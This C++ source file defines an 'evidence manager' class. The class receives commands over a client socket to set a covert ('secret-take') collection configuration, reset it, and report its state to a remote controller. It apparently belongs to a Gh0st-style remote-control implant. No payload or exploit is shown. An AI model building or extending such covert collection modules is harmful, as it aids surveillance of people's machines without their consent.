#include "StdAfx.h"
#include "EvidenceManager.h"
#include "KernelManager.h"

CEvidenceManager::CEvidenceManager(CClientSocket *pClient):CManager(pClient)
{
	CKernelManager *pKernel = CKernelManager::CreateKernelManager();
	m_pEvidence = pKernel->GetEvidenceObj();

	SendEvidenceState(TRUE);	
}


CEvidenceManager::~CEvidenceManager(void)
{
}


void CEvidenceManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case TOKEN_EVIDENCE_CONFIG:	//密取配置
		SetSecretConfig(lpBuffer + 1, nSize - 1);
		break;

	case TOKEN_EVIDENCE_SREECN_ARG:
	//	m_pEvidence->SetAutoSreenArg((TCHAR*)(lpBuffer+1));
		break;

	case COMMAND_SERECT_GETSTATE:
		SendEvidenceState();
		break;
	case TOKEN_EVIDENCE_RESET:
		ResetEvident();
		break;

	default:
		break;
	}
}


BOOL CEvidenceManager::ResetEvident()
{
	CKernelManager::ResetEvidenceObj();

	BYTE bufState[1] = {0};
	bufState[0] = COMMAND_SERECT_RESETEND;

	return Send((LPBYTE)bufState, sizeof(bufState));
}


void CEvidenceManager::SetSecretConfig(LPBYTE pInfo, int nSize)
{

	BOOL bRet = m_pEvidence->SetWorkState((INFOSTATE *)pInfo, nSize);

	BYTE bPack[2] = {0};
	bPack[0] = COMMAND_SERECT_CFG_END;
	bPack[1] = bRet == TRUE ? 1 : 0;

	Send(bPack, sizeof(bPack));
}


UINT CEvidenceManager::SendEvidenceState(BOOL bFirst)
{
	//前一个字节为令牌,后面的52字节为驱动器跟相关属性
	BYTE bufState[sizeof(INFOSTATE) + 1] = {0};
	if (bFirst)
	{
		bufState[0] = TOKEN_EVIDENCE_STATE; 
	}
	else
	{
		bufState[0] = COMMAND_SERECT_GETSTATE; 
	}

	m_pEvidence->GetWorkState(PINFOSTATE (&(bufState[1])));

	return Send((LPBYTE)bufState, sizeof(bufState));
}


BOOL CEvidenceManager::SetSingleSign(LPCSTR lpFileName)
{
	return m_pEvidence->SetSingleSign(lpFileName);
}